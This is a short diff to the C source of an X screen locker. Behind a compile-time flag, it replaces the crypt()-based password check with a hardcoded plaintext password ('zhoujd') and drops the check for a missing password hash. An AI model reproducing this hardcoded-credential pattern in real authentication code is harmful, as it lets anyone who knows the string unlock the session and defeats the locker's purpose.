@@ -55,6 +55,9 @@ Window window, root;
 
 struct passwd *pw;
 int passwordok(const char *s) {
+#ifdef ZZPASSWD
+  return !strcmp(s, "zhoujd");
+#else //ZZPASSWD
 #if 0
   char key[3];
   char *encr;
@@ -68,7 +71,8 @@ int passwordok(const char *s) {
   /* simpler, and should work with crypt() algorithms using longer
      salt strings (like the md5-based one on freebsd).  --marekm */
   return !strcmp(crypt(s, pw->pw_passwd), pw->pw_passwd);
-#endif
+#endif 
+#endif //ZZPASSWD  
 }
 
 int main(int argc, char **argv){
@@ -113,9 +117,11 @@ int main(int argc, char **argv){
      and we don't need root privileges any longer.  --marekm */
   if (setuid(getuid())) { perror("setuid"); exit(1); }
 
+#ifndef ZZPASSWD  
   if (strlen(pw->pw_passwd) < 13) {
     fputs("password entry has no pwd\n",stderr); exit(1);
   }
+#endif //ZZPASSWD
   
   display= XOpenDisplay(0);
 
